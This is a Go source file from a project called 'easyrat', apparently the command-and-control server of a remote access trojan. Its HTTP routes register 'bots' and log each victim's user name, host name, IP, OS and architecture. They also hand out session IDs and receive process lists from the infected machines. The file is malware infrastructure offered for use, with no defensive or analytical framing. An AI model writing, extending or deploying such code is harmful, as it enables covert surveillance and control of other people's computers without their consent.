package utils

import (
	"easyrat/utils/types"
	"fmt"
	"net/http"

	"github.com/labstack/echo"
)

var bots []types.DeviceInfoStruct

// Functions
func GetDevInfo(ctx echo.Context) types.DeviceInfoStruct {
	id := ctx.Request().Header.Get("Session-ID")
	var bot types.DeviceInfoStruct
	for b := range bots {
		if bots[b].MachineID == id {
			bot = bots[b]
			break
		}
	}
	return bot
}

// Routes
func RStatus(ctx echo.Context) error {
	ctx.JSON(http.StatusOK, types.ServerStatusResp{Status: "OK", Online: true})
	return nil
}

func RConnect(ctx echo.Context) error {
	dev_info := new(types.DeviceInfoStruct)
	ctx.Bind(dev_info)
	bots = append(bots, *dev_info)
	fmt.Printf("New bot connection: '%s@%s' (%s) %s, %s\n", dev_info.UserName, dev_info.HostName, ctx.RealIP(), dev_info.OSName, dev_info.Arch)
	return ctx.JSON(http.StatusOK, types.ConnectResp{SessionID: dev_info.MachineID, Connected: true})
}

func RProcList(ctx echo.Context) error {
	bot := GetDevInfo(ctx)
	proc_list := new([]types.Process)
	ctx.Bind(proc_list)
	fmt.Printf("Got process list for '%s@%s':\n", bot.UserName, bot.OSName)
	return nil
}
